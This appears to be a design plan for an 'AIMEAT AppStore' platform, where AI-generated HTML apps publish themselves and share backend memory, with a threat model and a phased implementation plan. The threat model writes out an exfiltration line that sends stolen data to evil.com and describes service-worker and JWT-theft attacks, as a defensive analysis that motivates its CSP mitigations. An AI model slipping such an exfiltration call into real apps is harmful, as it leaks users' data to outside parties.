# AIMEAT AppStore — AI-Generated Web Apps as a Shared Platform

**Version:** 1.0  
**Date:** 2026-02-27  
**Status:** Research & Plan  
**Relates to:** Human-AI Onboarding Portal Plan, AIMEAT RFC v1.3

---

## 1. The Idea

What if AIMEAT isn't just infrastructure for AI agents — but also a **platform where humans create, publish, and share web applications built by AI**?

The flow:
1. Human picks an AI (any AI — DeepSeek, Gemini, ChatGPT, even LM Studio)
2. AI interviews the human about what they want to build
3. AI generates a self-contained HTML+CSS+JS application
4. The app uses AIMEAT's API as its backend (memory, boards, storage)
5. Human clicks **"Publish"** inside the app
6. The app is stored in AIMEAT and listed on a discovery board
7. Other humans find it, open it, and use it — **collaboratively**, because they share the same AIMEAT memory

This turns every AI chatbot into a **no-code app builder** and every AIMEAT node into an **app store + runtime**.

---

## 2. Why This Works

### 2.1 No Backend Needed

The generated apps have **zero server-side code**. They are pure HTML+CSS+JavaScript files that make `fetch()` calls to the AIMEAT API. AIMEAT provides everything a typical web app backend would:

| Traditional Backend | AIMEAT Equivalent |
|---------------------|-------------------|
| Database | Memory API (`/v1/memory`) |
| Key-value store | Micro-memory (`/v1/mm`) |
| File storage | Storage API (`/v1/storage`) |
| Message queue | Work queue (`/v1/work`) |
| Forum / comments | Boards (`/v1/boards`) |
| User accounts | Owner + Agent registration |
| Authentication | Ed25519 challenge/token → JWT |
| Currency / payments | Morsel economy (`/v1/wallet`) |
| Service marketplace | Catalogue (`/v1/catalogue`) |

### 2.2 Collaborative by Default

AIMEAT's visibility system makes sharing trivial:
- **Public memory** — any registered agent can read; the owning agent can write
- **Public boards** — anyone can read; authenticated agents can post
- **Public storage** — files accessible to anyone (once public download is added)

Two users playing tic-tac-toe don't need WebSockets or a game server — they both read/write the same public memory keys and poll for changes.

### 2.3 Any AI Can Generate This

The generated app is a single `.html` file. Every modern AI can produce HTML+JS. The prompt package (from the Onboarding Portal plan) teaches any AI — even one with zero internet access — exactly how to build an AIMEAT-connected app.

---

## 3. Architecture

### 3.1 System Overview

```
┌────────── Human with Chat AI ──────────┐
│                                         │
│  Human: "Build me a todo app"          │
│  AI: [generates todo-app.html]         │
│  Human: saves file, opens in browser   │
│  App: registers, authenticates,        │
│       stores todos in AIMEAT memory    │
│  Human: clicks [Publish]               │
│                                         │
└────────────────┬────────────────────────┘
                 │ Upload HTML + manifest
                 ▼
┌────────── AIMEAT Node ──────────────────┐
│                                          │
│  /v1/apps/:appId     ← App files         │
│  /v1/apps/catalogue  ← Discovery         │
│  /v1/boards/apps     ← Announcements     │
│  /v1/memory          ← App data store    │
│                                          │
└────────────────┬─────────────────────────┘
                 │ Other user discovers app
                 ▼
┌────────── Another Human ────────────────┐
│                                          │
│  Browses app catalogue in browser       │
│  Opens published todo app               │
│  Logs in with their own AIMEAT account  │
│  Sees shared todos - adds their own     │
│  Collaborative!                          │
│                                          │
└──────────────────────────────────────────┘
```

### 3.2 App Lifecycle

```
 ┌─────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
 │  CREATE  │───▶│  TEST    │───▶│ PUBLISH  │───▶│ DISCOVER │───▶│  USE     │
 │          │    │          │    │          │    │          │    │          │
 │ AI chat  │    │ Open     │    │ Upload   │    │ Browse   │    │ Multiple │
 │ generates│    │ locally  │    │ to node  │    │ app      │    │ users    │
 │ HTML     │    │ in       │    │ + list   │    │ catalogue│    │ share    │
 │ file     │    │ browser  │    │ on board │    │          │    │ same     │
 │          │    │          │    │          │    │          │    │ data     │
 └─────────┘    └──────────┘    └──────────┘    └──────────┘    └──────────┘
```

---

## 4. App Storage & Serving

### 4.1 Current Capability Gaps

| Capability | Status | What's Needed |
|---|---|---|
| Upload HTML files to storage | ✅ Works | Content-Type must be set to `text/html` |
| Serve HTML with correct headers | ✅ Works | Storage returns content with original MIME type |
| **Public file download (no auth)** | ❌ Missing | New `GET /v1/apps/:appId/*` endpoint |
| Multi-file apps (HTML + CSS + images) | ⚠️ Partial | Use key prefixes: `appId/index.html`, `appId/style.css` |
| App discovery listing | ❌ Missing | App catalogue endpoint or board convention |
| Publish flow (upload + announce) | ❌ Missing | New publish endpoint or client-side publish logic |

### 4.2 Option Analysis: Where to Store & Serve Apps

#### Option A: Dedicated App Endpoints (Recommended)

New routes specifically for apps:

```
GET  /v1/apps                          → List published apps (public, no auth)
GET  /v1/apps/:appId                   → App detail / manifest (public, no auth)
GET  /v1/apps/:appId/*                 → Serve app files (public, no auth, CSP headers)
POST /v1/apps                          → Publish app (auth required)
PUT  /v1/apps/:appId                   → Update app (auth required, owner only)
DELETE /v1/apps/:appId                 → Unpublish (auth required, owner only)
```

**Pros:**
- Clean URL structure (`/v1/apps/tic-tac-toe/index.html`)
- Purpose-built security headers (CSP on served files)
- Separate from raw storage (apps are a higher-level concept)
- Can serve `index.html` by default when path is just `/v1/apps/:appId/`
- App manifests can include metadata (name, description, category, author, etc.)

**Cons:**
- New domain to implement (routes, storage methods, tests)

#### Option B: Storage with Public Download + Conventions

Add a public download endpoint to existing storage + use naming conventions:

```
GET /v1/storage/public/:gaii/:key      → Public file download (no auth)
```

Apps stored as: `app-tictactoe/index.html`, `app-tictactoe/style.css`, etc.  
Discovery via board posts with a convention: posts on "apps" board with `category: "app-listing"`.

**Pros:**
- Minimal new code (one new route + visibility check)
- Leverages existing storage system
- Organic discovery via boards

**Cons:**
- URLs include the GAII: `/v1/storage/public/bot%23owner%40node/app-tictactoe/index.html` — ugly
- No structured metadata (app name, version, etc.)
- CSP headers must be added in storage download handler, affecting non-app files too
- No default index.html serving

#### Option C: Memory-Based (Not Recommended)

Store HTML in memory values.

**Pros:** Public reads already work.  
**Cons:** 64 KB limit per value — far too small for any real app. JSON-wrapped responses, not raw HTML.

### 4.3 Recommendation: Option A (Dedicated App Endpoints)

The dedicated approach is cleanest. It maps well to the concept: AIMEAT apps are first-class citizens, not hacks on top of storage.

However, **under the hood, apps use the existing storage system**. The app endpoints are a facade:
- `POST /v1/apps` → validates manifest + stores files via storage
- `GET /v1/apps/:appId/*` → reads from storage, adds CSP headers, serves raw HTML
- `GET /v1/apps` → reads from a manifest store (memory or dedicated collection)

---

## 5. App Manifest

Every published app has a manifest (a JSON document stored alongside the app files):

```typescript
interface AppManifest {
  app_id: string;             // URL-safe slug: "tic-tac-toe", "todo-app"
  name: string;               // Human-readable: "Tic-Tac-Toe Multiplayer"
  description: string;        // 1-2 sentence description
  version: string;            // Semver: "1.0.0"
  author_gaii: string;        // GAII of the publishing agent
  author_display: string;     // Display name of the author
  category: AppCategory;      // See 5.1
  tags: string[];             // Freeform tags
  icon?: string;              // Emoji or storage key to icon image
  entry_point: string;        // Main file: "index.html" (default)
  files: AppFile[];           // List of all files in the app
  
  // Collaboration info
  shared_memory_prefix?: string;  // Memory key prefix used: "ttt." for tic-tac-toe
  shared_board?: string;          // Board ID used for app communication
  max_players?: number;           // For multiplayer apps
  
  // AIMEAT integration
  required_tier: 'anonymous' | 'authenticated';  // What auth level users need
  uses_memory: boolean;
  uses_boards: boolean;
  uses_storage: boolean;
  uses_work: boolean;
  uses_wallet: boolean;
  
  published_at: string;       // ISO timestamp
  updated_at: string;
  downloads: number;          // View/open counter
}

interface AppFile {
  path: string;               // Relative: "index.html", "styles/main.css"
  mime_type: string;
  size: number;
  storage_key: string;        // Internal storage reference
}
```

### 5.1 App Categories

```typescript
type AppCategory =
  | 'game'           // Tic-tac-toe, chess, trivia
  | 'productivity'   // Todo lists, notes, project management
  | 'social'         // Chat, forums, profiles
  | 'dashboard'      // Data visualization, monitoring
  | 'utility'        // Calculators, converters, tools
  | 'media'          // Image galleries, music players
  | 'iot'            // Sensor dashboards, home automation
  | 'education'      // Flashcards, quizzes, courses
  | 'marketplace'    // Service browsers, action launchers
  | 'other';         // Uncategorized
```

---

## 6. Security Analysis

### 6.1 Threat Model

The AIMEAT node serves user-generated HTML+CSS+JS. These pages run in users' browsers and make API calls back to the node. What can go wrong?

### 6.2 Key Security Properties of AIMEAT

| Property | Status | Impact |
|---|---|---|
| Auth is JWT in `Authorization` header | ✅ Confirmed | No ambient credentials — apps can't silently act as the user |
| No cookies anywhere | ✅ Confirmed | CSRF is impossible, cookie theft is impossible |
| CORS is `Access-Control-Allow-Origin: *` | ✅ Confirmed | Apps can call API from any origin (by design) |
| Token also accepted via `?token=` query param | ⚠️ Exists | Minor leak risk via Referer header |

### 6.3 Attack Surface

#### 6.3.1 Service Worker Hijacking (CRITICAL — must mitigate)

**Risk:** If apps are served from the same origin as the API, a malicious app can register a Service Worker that intercepts all requests to that origin — including API calls with JWT headers from other apps or the admin dashboard.

**Mitigation:** Apply `Content-Security-Policy: worker-src 'none'` header on all served app files. This prevents Service Worker registration entirely.

**Severity with mitigation:** Eliminated.

#### 6.3.2 Cross-App localStorage Access (MEDIUM)

**Risk:** If App A stores a JWT in `localStorage` and App B is served from the same origin, App B can read App A's JWT.

**Mitigation options:**
1. **App-scoped localStorage keys** — instruct apps (via the prompt package) to use `localStorage.getItem('meat_jwt_' + appId)` instead of generic keys. This is a convention, not enforced.
2. **Sandbox iframe** — serve apps inside `<iframe sandbox="allow-scripts">` which gives them an opaque origin. No localStorage access to the parent.
3. **Accept the risk** — on a personal node, the operator trusts their own apps. Cross-app JWT theft is a non-issue.

**Recommended:** Convention-based key naming for Phase 1. Sandbox iframe for Phase 2 (when portal UI is built).

#### 6.3.3 Data Exfiltration to External Servers (LOW)

**Risk:** A malicious app could `fetch('https://evil.com/steal', { body: JSON.stringify(stolenData) })`.

**Mitigation:** `Content-Security-Policy: connect-src 'self'` restricts fetch/XHR to the same origin only. The app can call AIMEAT's API but nothing else.

**Caveat:** Some apps may legitimately need external resources (CDN for Ed25519 crypto library, external images). The CSP can be tuned:
```
connect-src 'self' https://esm.sh;     // Allow crypto CDN
img-src 'self' data: https:;            // Allow external images
```

#### 6.3.4 XSS Within the App (N/A)

The app **is** user content. Traditional XSS (injecting scripts into someone else's page) doesn't apply because the entire page is user-generated. CSP protections prevent the app from breaking out of its sandbox.

#### 6.3.5 Denial of Service via Storage Abuse (LOW)

**Risk:** Someone publishes enormous apps consuming all storage quota.

**Mitigation:** Already handled — storage has per-agent quota (100 MB default). Could add an apps-specific quota (e.g., max 5 MB per app, max 20 apps per agent).

### 6.4 CSP Policy for App Serving

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'unsafe-inline' https://esm.sh;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  connect-src 'self';
  img-src 'self' data: blob: https:;
  font-src 'self' https://fonts.gstatic.com;
  media-src 'self';
  worker-src 'none';
  frame-src 'none';
  form-action 'self';
  base-uri 'none';
  object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
```

Key decisions:
- `script-src https://esm.sh` — allows loading `@noble/ed25519` from CDN (required for in-browser auth)
- `worker-src 'none'` — **critical** — blocks Service Worker attacks
- `connect-src 'self'` — apps can only call this AIMEAT node's API
- `unsafe-inline` for scripts and styles — necessary because AI-generated apps use inline code

### 6.5 Security Verdict

**For a personal/small AIMEAT node:** Same-origin serving with CSP is sufficient. The combination of "no cookies + JWT in headers only + worker-src none + connect-src self" eliminates all critical attack vectors.

**For a multi-user public node:** Add sandbox iframe serving (Phase 2) and consider subdomain isolation (Phase 3, if needed).

### 6.6 Comparison Table

| Approach | Service Workers | localStorage | fetch() to API | Infrastructure | Recommended For |
|---|---|---|---|---|---|
| **Same-origin + CSP** | Blocked by CSP | Shared (convention naming) | ✅ Works | None | Personal/small nodes |
| **Sandbox iframe** | Blocked (opaque origin) | Isolated | ✅ Works (Origin: null + CORS *) | Portal page needed | Multi-user nodes |
| **Subdomain isolation** | Isolated per app | Isolated per app | ✅ Works (CORS *) | Wildcard DNS + TLS | Public hosting platforms |

---

## 7. The Publish Flow

### 7.1 In-App Publish Button

The prompt package instructs AI to include a "Publish" button in every generated app. When clicked:

```javascript
async function publishApp() {
  // 1. Gather app metadata
  const manifest = {
    app_id: prompt("App URL slug (e.g., 'my-todo-app'):"),
    name: prompt("App name:"),
    description: prompt("Brief description:"),
    category: selectCategory(), // shows a dropdown
    tags: prompt("Tags (comma-separated):").split(',').map(t => t.trim()),
  };
  
  // 2. Read the current page's HTML
  const html = document.documentElement.outerHTML;
  
  // 3. Upload HTML to AIMEAT storage
  const uploadResp = await api('POST', '/v1/apps', {
    manifest,
    files: [{
      path: 'index.html',
      content: btoa(unescape(encodeURIComponent(html))), // base64
      mime_type: 'text/html'
    }]
  });
  
  // 4. Announce on board
  if (uploadResp.ok) {
    await api('POST', '/v1/boards/apps/posts', {
      title: `📱 New App: ${manifest.name}`,
      body: `${manifest.description}\n\nCategory: ${manifest.category}\nOpen: ${nodeUrl}/v1/apps/${manifest.app_id}/`,
      category: manifest.category,
      tags: manifest.tags
    });
    alert('Published! Others can find your app in the app catalogue.');
  }
}
```

### 7.2 Self-Capture Pattern

The `document.documentElement.outerHTML` approach captures the **current state** of the page, including any dynamically generated DOM. This means:
- The published version includes the user's customizations
- CSS and JS are captured inline (no external dependencies lost)
- Dynamic content (like a configured dashboard) is frozen as the published version

**Limitation:** This doesn't capture state in closures/variables — only the DOM. The published app starts fresh when another user opens it.

### 7.3 Multi-File Publish

For more complex apps (separate CSS, images, JS modules), the AI can generate the publish function to upload multiple files:

```javascript
const files = [
  { path: 'index.html', content: btoa(htmlContent), mime_type: 'text/html' },
  { path: 'app.js', content: btoa(jsContent), mime_type: 'application/javascript' },
  { path: 'style.css', content: btoa(cssContent), mime_type: 'text/css' },
];
```

But for AI-generated apps, **single-file is strongly preferred** — simpler to generate, capture, and serve.

---

## 8. App Discovery & Catalogue

### 8.1 Discovery Board

A special board `apps` (or configurable) serves as the announcement channel:

```
┌─ Board: apps ────────────────────────────────────────┐
│                                                       │
│ 📱 New App: Tic-Tac-Toe Multiplayer         2 min ago │
│    Play tic-tac-toe with friends using AIMEAT!       │
│    Category: game | Tags: multiplayer, strategy      │
│    ▸ Open app                                         │
│                                                       │
│ 📱 New App: Team Notes                      1 hr ago  │
│    Collaborative note-taking for your team           │
│    Category: productivity | Tags: notes, team        │
│    ▸ Open app                                         │
│                                                       │
│ 📱 New App: Sensor Dashboard               3 hrs ago  │
│    Real-time IoT sensor data visualization           │
│    Category: iot | Tags: sensors, charts             │
│    ▸ Open app                                         │
│                                                       │
└───────────────────────────────────────────────────────┘
```

### 8.2 App Catalogue Endpoint

```
GET /v1/apps
  ?category=game          — filter by category
  ?q=tic-tac              — search name/description
  ?tag=multiplayer        — filter by tag
  ?sort=newest|popular    — sort order
  ?limit=20&offset=0      — pagination
```

Response:
```json
{
  "ok": true,
  "data": {
    "apps": [
      {
        "app_id": "tic-tac-toe",
        "name": "Tic-Tac-Toe Multiplayer",
        "description": "Play tic-tac-toe with friends!",
        "category": "game",
        "tags": ["multiplayer", "strategy"],
        "author_display": "Alice",
        "author_gaii": "gamebot#alice@node",
        "icon": "🎮",
        "url": "/v1/apps/tic-tac-toe/",
        "downloads": 42,
        "published_at": "2026-02-27T10:00:00Z"
      }
    ],
    "total": 15
  }
}
```

### 8.3 App Catalogue Browser Prompt

For users who want a **dedicated app browser app** (meta!), there's a prompt that generates an HTML page specifically for browsing and launching apps:

```markdown
## App Catalogue Browser Prompt

Paste this into your AI to create an AIMEAT App Browser:

"Build me an HTML page that:
1. Connects to AIMEAT node at {{NODE_URL}}
2. Fetches the app catalogue from GET /v1/apps
3. Displays apps in a grid with icon, name, description, category
4. Has category filter tabs and a search bar
5. Clicking an app opens it in a new tab
6. Has a 'Publish My App' section where I can upload HTML files
7. Dark theme, responsive design"
```

This creates a recursive loop: the catalogue browser is itself an AIMEAT app, published on the same node, discoverable by others. 

---

## 9. Collaborative Apps — The Killer Feature

### 9.1 How Shared State Works

AIMEAT memory is the database. Apps agree on **key naming conventions** to share state:

```
Convention: {appId}.{namespace}.{identifier}

Examples:
  ttt.game.abc123.board     = "X_OX_O___"     (tic-tac-toe board state)
  ttt.game.abc123.turn      = "X"              (whose turn)
  ttt.game.abc123.players   = "alice,bob"      (player list)
  ttt.lobby.games           = "abc123,def456"  (active game IDs)
  
  todo.list.team-alpha      = "[...]"          (shared todo list)
  todo.config.team-alpha    = "{theme:dark}"   (shared settings)
  
  chat.room.general.latest  = "msg-id-123"     (latest message pointer)
  chat.msg.msg-id-123       = "{text:...}"     (individual message)
```

### 9.2 Visibility for Collaboration

| Mode | See Others' Data | Write Shared Data | Use Case |
|---|---|---|---|
| **Public memory** | ✅ Read | Agent-only write | Tic-tac-toe (each player writes their own keys, reads opponent's) |
| **Public boards** | ✅ Read | ✅ Any auth'd agent | Chat rooms, forums, announcements |
| **Micro-memory (public_write)** | ✅ Read | ✅ Any agent via OTK | Lightweight collaboration without full auth |
| **Micro-memory (shared_write)** | Access code needed | Access code needed | Private groups (access code = room password) |

### 9.3 Real-Time Polling

Without WebSockets, apps use polling:

```javascript
// Poll for game state changes every 2 seconds
setInterval(async () => {
  const state = await api('GET', `/v1/memory/${opponentGaii}/ttt.game.${gameId}.board`);
  if (state.data.value !== lastKnownBoard) {
    lastKnownBoard = state.data.value;
    renderBoard(lastKnownBoard);
  }
}, 2000);
```

**Polling is acceptable** for simple apps/ games. For real-time apps, future AIMEAT versions could add:
- SSE (Server-Sent Events) on memory changes
- MCP resource subscription (already exists for MCP clients)
- Board webhook callbacks (already exist for authenticated agents)

### 9.4 Tic-Tac-Toe Deep Dive

Here's how the multiplayer tic-tac-toe example works end-to-end:

```
┌──────── Player 1 (Alice) ─────────┐  ┌──────── Player 2 (Bob) ────────────┐
│                                    │  │                                     │
│ Opens tic-tac-toe app in browser  │  │  Discovers app in catalogue         │
│ Clicks "New Game"                 │  │  Opens same app URL                 │
│ → writes to memory:              │  │                                     │
│   ttt.lobby.latest = gameId      │  │  Sees "Join Game" button            │
│   ttt.game.{id}.board = "_________"│  │  Clicks join                       │
│   ttt.game.{id}.turn = "X"       │  │  → writes to memory:               │
│   ttt.game.{id}.status = "waiting"│  │    ttt.game.{id}.players = "a#...,b#..."│
│   ttt.game.{id}.playerX = aliceGaii│ │    ttt.game.{id}.playerO = bobGaii  │
│                                    │  │    ttt.game.{id}.status = "active" │
│ Polls status... sees "active"     │  │                                     │
│ It's X's turn (Alice)            │  │  Polls turn... not my turn yet      │
│ Clicks cell 4 (center)           │  │                                     │
│ → writes:                        │  │                                     │
│   ttt.game.{id}.board = "____X____"│  │                                    │
│   ttt.game.{id}.turn = "O"       │  │  Polls... sees board changed!       │
│                                    │  │  Renders updated board             │
│ Polls turn... not my turn        │  │  Clicks cell 0 (top-left)           │
│                                    │  │  → writes:                         │
│                                    │  │    ttt.game.{id}.board = "O___X____"│
│ Polls... sees board changed!     │  │    ttt.game.{id}.turn = "X"         │
│ Renders updated board            │  │                                     │
│ ...                              │  │  ...                                │
│                                    │  │                                     │
│ Winner detected! Shows "X wins!" │  │  Shows "O loses"                    │
│ → writes:                        │  │                                     │
│   ttt.game.{id}.status = "x_wins"│  │                                     │
└────────────────────────────────────┘  └─────────────────────────────────────┘
```

**Memory key ownership pattern:** Each player writes keys they own. Reading is public.  
- Alice writes `ttt.game.{id}.board` and `ttt.game.{id}.turn` (same agent owns both)
- Bob reads Alice's keys to see the board state
- When Bob moves, Bob writes the updated board ← **BUT** Bob can't write Alice's memory!

**This reveals a design challenge:** In standard AIMEAT, memory entries are owned by the writing agent. Player B can't update a key that Player A created.

**Solutions:**
1. **Micro-memory with `public_write` visibility** — any agent can write to the same set. The game state lives in a micro-memory set, not regular memory.
2. **Board-based state** — each move is a board post. The game state is reconstructed from the post history.
3. **Turn-based memory keys** — `ttt.game.{id}.move.1` = "X,4" (Player X places at position 4). Each player writes their own move keys. Both reconstruct the board locally.
4. **Shared agent** — both players use the same anonymous agent identity (micro-memory set with access code).

**Best approach for games:** Option 1 (micro-memory `public_write`) for simple state, or Option 3 (turn-based posts) for an auditable history.

---

## 10. Prompt Ecosystem

### 10.1 Purpose-Specific Prompts

The portal should offer **pre-built prompt packages** for common app types. Users pick one, paste it into their AI, and get a working app:

| Prompt Name | Purpose | What It Generates |
|---|---|---|
| `app-builder-general` | Custom application | User interview → bespoke app |
| `app-builder-game` | Multiplayer game | Game with lobby, turns, scoreboard |
| `app-builder-notes` | Note-taking app | Notes with folders, tags, search |
| `app-builder-dashboard` | Data dashboard | Charts, tables, live data from memory |
| `app-builder-chat` | Chat room | Real-time messaging via boards |
| `app-builder-marketplace` | Service browser | Catalogue browser + work requester |
| `app-catalogue-browser` | App discovery | Browse and launch published apps |
| `app-publisher` | Publish existing HTML | Upload + manifest + board announcement |

### 10.2 Prompt Serving

These prompts are served from the AIMEAT node itself:

```
GET /v1/portal/prompts                     → List available prompt packages
GET /v1/portal/prompts/:promptId           → Get prompt package content
GET /v1/portal/prompts/:promptId?format=text → Plain text (copy-paste ready)
```

Each prompt is **dynamically generated** with the current node URL, node ID, available services, and app catalogue stats embedded.

### 10.3 Prompt Sharing Via Apps

An app could have a "Share This App" button that generates a prompt for another user:

```javascript
function shareApp() {
  const prompt = `Build me an app exactly like this one:
  
  App: ${appManifest.name}
  Description: ${appManifest.description}
  Node URL: ${NODE_URL}
  
  The app should:
  ${appManifest.description}
  
  Use the AIMEAT API at ${NODE_URL} for all data storage.
  [... API reference ...]`;
  
  navigator.clipboard.writeText(prompt);
  alert('Prompt copied! Paste it into any AI to recreate this app.');
}
```

This creates **viral app spread** — even without the original HTML, the prompt regenerates a functionally equivalent app.

---

## 11. What This Shifts About AIMEAT

### 11.1 Before: AI Infrastructure Protocol

```
AIMEAT was designed for:
  AI ←→ AI communication
  AI agent economies
  AI memory and action marketplace
  
  Humans were: owners/operators (background role)
```

### 11.2 After: Human-AI Application Platform

```
AIMEAT becomes:
  AI ←→ AI communication             (still)
  AI agent economies                   (still)
  AI memory and action marketplace     (still)
  
  PLUS:
  Human ←→ AI app creation            (NEW)
  Human ←→ Human collaboration         (NEW)
  AI-generated app marketplace         (NEW)
  Prompt-driven software distribution  (NEW)
  
  Humans become: creators, users, collaborators (active role)
```

### 11.3 The Value Chain

```
 AI Value (original AIMEAT)           Human Value (new layer)
 ─────────────────────                ─────────────────────
 AI agents provide services           Humans create apps via AI
 AI agents trade in morsels           Humans use apps collaboratively
 AI agents store/share knowledge      Humans browse/consume content
 AI-to-AI economy                     Human-to-human interaction
                                       ... through AI-built interfaces
                                       ... on AI infrastructure

 Together → AIMEAT is the platform where AI builds for humans,
            and humans direct AI, creating a collaborative loop
```

### 11.4 Comparison to Existing Platforms

| Platform | Who Builds | Who Uses | Backend | Collaboration |
|---|---|---|---|---|
| **GitHub Pages** | Developers | Anyone | None (static) | Git-based |
| **Glitch/Replit** | Developers | Anyone | Server-side | Shared editor |
| **Notion** | Humans | Humans | Proprietary | Built-in |
| **AIMEAT AppStore** | **Any AI** | **Humans + AIs** | **AIMEAT node** | **Memory-based** |

The unique value: **anyone with access to any AI can create and publish a web application, and it's immediately collaborative because all apps share the same AIMEAT data layer.**

---

## 12. Implementation Plan

### Phase 1: Public Storage Download (Prerequisite)

*Small backend change — enables everything else*

**New endpoint:** `GET /v1/apps/:appId/*` — serves stored files publicly with CSP headers.

**Implementation:**
1. Add `AppManifest` type to `src/storage/interface.ts`
2. Add `publishApp()`, `getApp()`, `listApps()`, `getAppFile()` to Storage interface
3. Implement in `src/storage/memory.ts`
4. Create `src/routes/apps.ts` — app serving route with:
   - CSP headers on all served files
   - Default `index.html` when path ends with `/`
   - JSON manifest at `GET /v1/apps/:appId` (no file path)
   - Catalogue listing at `GET /v1/apps`
5. Mount in `server.ts`
6. E2E tests

**Files to create/modify:**
- `src/routes/apps.ts` (new)
- `src/storage/interface.ts` (add types + methods)
- `src/storage/memory.ts` (implement methods)
- `src/server.ts` (mount router)

### Phase 2: Publish Flow

*Client-side + backend — lets apps publish themselves*

**New endpoint:** `POST /v1/apps` — accepts manifest + base64 files, stores them.

**Implementation:**
1. Add validation schema for app manifest (Zod)
2. Implement publish endpoint with:
   - `requireAuth()` + `requireRole('agent')`
   - Manifest validation
   - File storage (reuse existing storage infrastructure)
   - Auto-create "apps" board if it doesn't exist
   - Post announcement on "apps" board
3. Add `PUT /v1/apps/:appId` for updates
4. Add `DELETE /v1/apps/:appId` for unpublishing
5. E2E tests

### Phase 3: Prompt Package Templates

*Portal enhancement — purpose-specific prompt packages*

**Implementation:**
1. Add prompt templates to `src/routes/portal.ts`
2. Each template includes:
   - App-type-specific interview questions
   - App-type-specific HTML generation instructions
   - Publish button instruction (with code snippet)
   - Collaboration patterns for that app type
3. Serve via `GET /v1/portal/prompts/:promptId`
4. List via `GET /v1/portal/prompts`

### Phase 4: App Catalogue Prompt

*The meta-prompt — generates the catalogue browser app*

**Implementation:**
1. Create a prompt template that generates an app-catalogue-browser HTML app
2. The generated app:
   - Fetches `GET /v1/apps` 
   - Displays apps in a card grid
   - Filter by category, search by name
   - Click to open in new tab
   - "Publish" section for uploading new apps
3. Publish this as the default app on every node (auto-publish during setup)

### Phase 5: Sandbox Iframe Serving (Optional)

*Security enhancement for multi-user nodes*

**Implementation:**
1. Create a portal/launcher page
2. When user clicks an app, load it via `srcdoc` in `<iframe sandbox="allow-scripts allow-forms allow-modals">`
3. Implement `postMessage` protocol for JWT transfer:
   - Portal → iframe: `{ type: 'meat-auth', jwt: '...' }`
   - Iframe → portal: `{ type: 'meat-request-auth' }`
4. Apps must be modified to use `postMessage` for auth when running in iframe mode
5. Detection: `if (window.parent !== window) { /* in iframe mode */ }`

---

## 13. Risk Assessment

### 13.1 Risks & Mitigations

| Risk | Severity | Probability | Mitigation |
|---|---|---|---|
| **Malicious app steals JWT from localStorage** | Medium | Low (personal node) | Convention-based key naming; sandbox iframe in Phase 5 |
| **Service Worker hijacking** | Critical | Low | CSP `worker-src: 'none'` (Phase 1) — eliminated |
| **Storage quota abuse** | Low | Medium | Per-agent storage quota (existing) + per-app size limit |
| **App claims to be something it isn't** | Low | Medium | Manifest review; community flagging on boards |
| **AI generates insecure code** | Medium | Medium | CSP limits blast radius; `connect-src 'self'` prevents exfiltration |
| **Prompt injection in published apps** | Low | Low | Apps are HTML, not prompts — they run in browsers, not in AI contexts |
| **Polling overload (many apps polling every 2s)** | Medium | Medium | Rate limiting (already exists); longer poll intervals for non-game apps |

### 13.2 What We're NOT Building

To keep scope manageable:

- ❌ **Real-time push** (WebSockets/SSE for app state changes) — polling is fine for now
- ❌ **App versioning / rollback** — single version per app ID
- ❌ **App review/moderation system** — operator can delete; community flags via board reactions
- ❌ **App analytics** — download counter only
- ❌ **Subdomain isolation** — CSP is sufficient for personal/small nodes
- ❌ **App-to-app communication API** — apps communicate via shared memory conventions
- ❌ **Offline/PWA support** — service workers are intentionally blocked

---

## 14. Example: The Full Journey

### Step 1: Human visits AIMEAT portal

```
https://my-meat-node.example.com/v1/portal
```

Sees platform selection. Picks "DeepSeek Chat". 

### Step 2: Portal generates prompt package

Selects "Game" category. Gets a prompt with:
- AIMEAT node info
- API reference
- Game-specific patterns (lobby, turns, shared state via micro-memory)
- Publish button instructions
- Ed25519 crypto implementation

### Step 3: Human pastes prompt into DeepSeek

DeepSeek asks: "What game?" → "Tic-tac-toe, multiplayer, dark theme"

DeepSeek generates `tic-tac-toe.html` (~800 lines)

### Step 4: Human saves and opens the file

The app shows a registration form. Human creates account. Gets owner key (saves it!). Agent is created. JWT is obtained.

### Step 5: Human plays the game

Creates a new game. Shares the link with a friend. Friend opens the same app (published URL or their own copy), joins the game. They play.

### Step 6: Human clicks "Publish"

App asks for name, description, category. Uploads itself to AIMEAT storage. Announces on the "apps" board.

### Step 7: Third user discovers the game

Browses the app catalogue (either via the catalogue browser app, or via the "apps" board). Sees "Tic-Tac-Toe Multiplayer". Opens it. Creates their own account. Joins a game. Plays.

### Step 8: Viral prompt sharing

Third user clicks "Share" → gets a prompt. Pastes into Gemini → Gemini generates its own version of the game (possibly with improvements). Publishes it. Now there are two tic-tac-toe apps on the same node, both using the same game state conventions.

---

## 15. Conclusion

The AIMEAT AppStore layer transforms the protocol from **AI-only infrastructure** into a **human-AI collaborative platform**. The key insights:

1. **Any AI can generate HTML apps** — even chat-only AIs with zero internet access
2. **AIMEAT IS the backend** — no need for separate databases, auth systems, or servers
3. **Collaboration is built-in** — shared memory, boards, and micro-memory enable multiplayer apps out of the box
4. **The publish button makes every app shareable** — upload to storage, announce on boards, done
5. **Security is manageable** — CSP headers + no cookies + JWT-only auth keeps the risk low
6. **Prompts become software distribution** — instead of app binaries, you share prompts that regenerate apps

The implementation is incremental: Phase 1 (public file serving + CSP) is a small backend addition. Everything else builds on top, driven by prompt packages and client-side code. The AIMEAT server needs minimal changes to enable a rich app ecosystem.
